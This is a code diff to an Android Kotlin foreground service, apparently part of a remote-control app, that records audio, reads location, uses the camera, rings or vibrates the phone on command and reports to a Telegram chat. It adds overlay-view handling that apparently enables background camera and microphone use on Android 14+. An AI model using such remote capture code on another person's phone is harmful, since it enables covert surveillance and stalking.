@@ -8,6 +8,7 @@ import android.media.RingtoneManager
 import android.os.*
 import android.util.Log
 import android.view.SurfaceHolder
+import android.view.View
 import kotlinx.coroutines.*
 import org.json.JSONObject
 import java.io.File
@@ -16,6 +17,8 @@ import android.content.pm.ServiceInfo
 
 object ServiceHolder {
     var surfaceHolder: SurfaceHolder? = null
+    var overlaySurfaceView: View? = null
+    var overlayView: View? = null
     var isRunning: Boolean = false
 }
 
@@ -54,9 +57,15 @@ class ForegroundActionService : Service() {
                     UploadManager.sendTelegramMessage(chatId, "[$deviceNickname] Error: Exception in $action: ${formatDateTime(System.currentTimeMillis())}.")
                 }
             } finally {
+                // Overlay removal: always remove overlays here after job is finished, for all actions
                 if (Build.VERSION.SDK_INT >= 34) {
-                    OverlayHelper.removeOverlay(this@ForegroundActionService)
+                    try {
+                        ServiceHolder.overlaySurfaceView?.let { OverlayHelper.removeOverlay(this@ForegroundActionService, it) }
+                        ServiceHolder.overlayView?.let { OverlayHelper.removeOverlay(this@ForegroundActionService, it) }
+                    } catch (_: Exception) {}
                     ServiceHolder.surfaceHolder = null
+                    ServiceHolder.overlaySurfaceView = null
+                    ServiceHolder.overlayView = null
                 }
                 ServiceHolder.isRunning = false
                 stopSelf()
@@ -182,8 +191,13 @@ class ForegroundActionService : Service() {
     override fun onDestroy() {
         job?.cancel()
         if (Build.VERSION.SDK_INT >= 34) {
-            OverlayHelper.removeOverlay(this)
+            try {
+                ServiceHolder.overlaySurfaceView?.let { OverlayHelper.removeOverlay(this, it) }
+                ServiceHolder.overlayView?.let { OverlayHelper.removeOverlay(this, it) }
+            } catch (_: Exception) {}
             ServiceHolder.surfaceHolder = null
+            ServiceHolder.overlaySurfaceView = null
+            ServiceHolder.overlayView = null
         }
         ServiceHolder.isRunning = false
         super.onDestroy()
@@ -191,6 +205,7 @@ class ForegroundActionService : Service() {
 
     override fun onBind(intent: Intent?): IBinder? = null
 
+    // Only pass FGS type for camera/audio/location, for others (ring/vibrate/unknown) pass no type!
     private fun showNotificationForAction(action: String) {
         val notification = androidx.core.app.NotificationCompat.Builder(this, NotificationHelper.CHANNEL_ID)
             .setContentTitle("Remote Control Service")
@@ -204,24 +219,24 @@ class ForegroundActionService : Service() {
                 "location" -> ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
                 else -> 0
             }
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            if (type != 0) {
+        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q && type != 0) {
+            try {
+                startForeground(1, notification, type)
+            } catch (e: SecurityException) {
+                Log.e("ForegroundActionService", "SecurityException: ${e.message}")
                 try {
-                    startForeground(1, notification, type)
-                } catch (e: SecurityException) {
-                    Log.e("ForegroundActionService", "SecurityException: ${e.message}")
-                    if (Build.VERSION.SDK_INT >= 34) {
-                        OverlayHelper.removeOverlay(this)
-                        ServiceHolder.surfaceHolder = null
-                    }
-                    ServiceHolder.isRunning = false
-                    stopSelf()
-                    return
-                }
-            } else {
-                startForeground(1, notification)
+                    ServiceHolder.overlaySurfaceView?.let { OverlayHelper.removeOverlay(this, it) }
+                    ServiceHolder.overlayView?.let { OverlayHelper.removeOverlay(this, it) }
+                } catch (_: Exception) {}
+                ServiceHolder.surfaceHolder = null
+                ServiceHolder.overlaySurfaceView = null
+                ServiceHolder.overlayView = null
+                ServiceHolder.isRunning = false
+                stopSelf()
+                return
             }
         } else {
+            // For ring, vibrate, and others, do NOT pass a foreground type!
             startForeground(1, notification)
         }
     }
@@ -245,7 +260,8 @@ class ForegroundActionService : Service() {
             type: String,
             options: JSONObject,
             chatId: String?,
-            surfaceHolder: SurfaceHolder? = null
+            surfaceHolder: SurfaceHolder? = null,
+            overlaySurfaceView: View? = null
         ) {
             val intent = Intent(context, ForegroundActionService::class.java)
             intent.putExtra("action", type)
@@ -257,46 +273,51 @@ class ForegroundActionService : Service() {
             }
             chatId?.let { intent.putExtra("chat_id", it) }
             ServiceHolder.surfaceHolder = surfaceHolder
+            ServiceHolder.overlaySurfaceView = overlaySurfaceView
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
                 context.startService(intent)
             }
         }
-        fun startAudioAction(context: Context, options: JSONObject, chatId: String?) {
+        fun startAudioAction(context: Context, options: JSONObject, chatId: String?, overlayView: View? = null) {
             val duration = options.optInt("duration", 60)
             val intent = Intent(context, ForegroundActionService::class.java)
             intent.putExtra("action", "audio")
             intent.putExtra("duration", duration)
             chatId?.let { intent.putExtra("chat_id", it) }
+            ServiceHolder.overlayView = overlayView
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
                 context.startService(intent)
             }
         }
-        fun startLocationAction(context: Context, chatId: String?) {
+        fun startLocationAction(context: Context, chatId: String?, overlayView: View? = null) {
             val intent = Intent(context, ForegroundActionService::class.java)
             intent.putExtra("action", "location")
             chatId?.let { intent.putExtra("chat_id", it) }
+            ServiceHolder.overlayView = overlayView
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
                 context.startService(intent)
             }
         }
-        fun startRingAction(context: Context, options: JSONObject) {
+        fun startRingAction(context: Context, options: JSONObject, overlayView: View? = null) {
             val intent = Intent(context, ForegroundActionService::class.java)
             intent.putExtra("action", "ring")
+            ServiceHolder.overlayView = overlayView
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
                 context.startService(intent)
             }
         }
-        fun startVibrateAction(context: Context, options: JSONObject) {
+        fun startVibrateAction(context: Context, options: JSONObject, overlayView: View? = null) {
             val intent = Intent(context, ForegroundActionService::class.java)
             intent.putExtra("action", "vibrate")
+            ServiceHolder.overlayView = overlayView
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(intent)
             } else {
